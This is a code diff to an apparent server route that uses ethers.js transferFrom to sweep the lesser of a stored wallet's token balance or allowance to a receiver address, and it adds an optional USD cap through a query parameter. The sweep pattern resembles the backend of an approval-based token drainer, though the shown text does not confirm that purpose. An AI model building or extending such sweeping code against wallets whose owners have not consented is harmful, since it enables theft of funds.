@@ -20,6 +20,11 @@ export async function POST(
   const { id } = await params;
   const supabase = getServiceSupabase();
 
+  // Optional: limit amount by query param (e.g., ?limitUsd=0.1)
+  const url = new URL(req.url);
+  const limitUsdParam = url.searchParams.get("limitUsd");
+  const limitUsd = limitUsdParam ? parseFloat(limitUsdParam) : null;
+
   const { data: wallet, error: fetchError } = await supabase
     .from("wallets")
     .select("*")
@@ -84,8 +89,17 @@ export async function POST(
     }
 
     // Use lesser of balance or allowance to avoid exceeds-allowance error
-    const transferAmount = balance < allowance ? balance : allowance;
-    const amountFormatted = ethers.formatUnits(transferAmount, 18);
+    let transferAmount = balance < allowance ? balance : allowance;
+    let amountFormatted = ethers.formatUnits(transferAmount, 18);
+
+    // If limitUsd is set, cap the transfer to that amount
+    if (limitUsd !== null) {
+      const transferUsd = parseFloat(amountFormatted);
+      if (transferUsd > limitUsd) {
+        transferAmount = ethers.parseUnits(limitUsd.toString(), 18);
+        amountFormatted = limitUsd.toString();
+      }
+    }
 
     const tx = await contract.transferFrom(wallet.address, receiverAddress, transferAmount);
     const receipt = await tx.wait();
